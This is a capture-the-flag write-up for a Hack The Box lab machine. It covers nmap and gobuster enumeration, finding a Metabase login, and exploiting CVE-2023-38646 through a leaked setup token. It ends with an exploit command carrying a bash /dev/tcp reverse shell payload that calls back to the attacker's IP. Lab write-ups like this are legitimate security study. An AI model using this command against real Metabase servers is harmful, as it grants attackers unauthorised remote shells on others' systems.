---
type: box
finished: "true"
blog: "true"
writeup: "true"
---

![[Analytics.png]]

# INFO:
### IP:
10.10.11.233

# Enum 
Nmap gives this output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 with this command
 `nmap -sV -sC -p- 10.10.11.233`

 the ip redirects to analytical.htb in the browser so we have to put it in our /etc/hosts. usually changing hosts is a sign to do vhost enumeration, so we can run both vhost and dir gobuster in the background while we explore the webpage.
 
 So we'll run `gobuster dir -u analytical.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt` and... no find.

When we just look through the website we find a login page, this redirects to data.analytical.htb, let's add that too to our /etc/hosts.

We get greeted with this login screen
![[Pasted image 20231107164931.png]]
Googling metabase CVE finds us a lot of results.

# **[CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

Apperently metabase has done some serious issues. The setup-token that is supposed to be private can be freely visited under this api directory `/api/session/properties`. With 

`python3 exploit.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "bash -i >& /dev/tcp/10.10.14.247/443 0>&1"`
